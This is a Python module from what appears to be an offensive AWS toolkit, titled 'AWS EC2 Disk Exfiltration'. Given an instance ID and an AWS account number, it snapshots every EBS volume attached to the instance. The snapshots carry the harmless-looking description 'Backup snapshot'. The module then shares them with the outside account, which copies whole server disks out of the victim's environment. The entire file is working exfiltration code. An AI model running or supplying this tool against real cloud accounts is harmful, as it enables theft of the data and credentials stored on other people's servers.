import argparse
import boto3
from botocore.exceptions import ClientError

from .DoorModule import DoorModule

class EC2DiskExfiltration(DoorModule):
    class Meta:
        name = 'AWS EC2 Disk Exfiltration'
        help = 'Create a disk snapshoit and share it with a remote AWS account in private mode'

    def __init__(self, argv:list[str]):
        parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
        parser.add_argument(
            '-i',
            '--instance',
            help='The EC2 instance to snapshot',
            required=True
        )
        parser.add_argument(
            '-a',
            '--account',
            help='The AWS account to share the snapshot with',
            required=True
        )
        args, _ = parser.parse_known_args(argv)
        self.instance = args.instance
        self.account = args.account

    def run(self):
        ec2 = boto3.client('ec2')
        try:
            response = ec2.describe_instances(InstanceIds=[self.instance])
        except Exception as e:
            print(f"[x] Failed to find the EC2 {self.instance}")
            return
        volumes = []

        for reservation in response['Reservations']:
            for instance in reservation['Instances']:
                for mapping in instance.get('BlockDeviceMappings', []):
                    volume_id = mapping['Ebs']['VolumeId']
                    volumes.append(volume_id)
        print(f'[-] The following volumes will be snapshoted and shared with {self.account}: ')
        [print(f'\t- {volume_id}') for volume_id in volumes]
        confirm = input("\n[+] Do you want to apply this change? (yes/no): ").strip().lower()
        if confirm.lower() not in ("yes", "y"):
            print('[-] Aborting changes, no snapshot created')
            return

        snapshots = []
        for volume in volumes:
            try:
                response = ec2.create_snapshot(
                    VolumeId=volume,
                    Description='Backup snapshot',
                    TagSpecifications=[
                        {
                            'ResourceType': 'snapshot',
                            'Tags': [
                                {'Key': 'VolumeId', 'Value': volume_id}
                            ]
                        }
                    ]
                )
                print(f"[-] Created snapshot {response['SnapshotId']} for volume {volume}")
                snapshots.append(response['SnapshotId'])
            except Exception as e:
                print(f"[x] Failed to create snapshot {volume}: {e}")

        for snapshot in snapshots:
            try:
                response = ec2.modify_snapshot_attribute(
                    SnapshotId=snapshot,
                    Attribute='createVolumePermission',
                    OperationType='add',
                    UserIds=[self.account]
                )
                print(f'[+] Shared snapshot {snapshot} with account {self.account}')
            except Exception as e:
                print(f"[x] Failed to share snapshot {snapshot}: {e}")


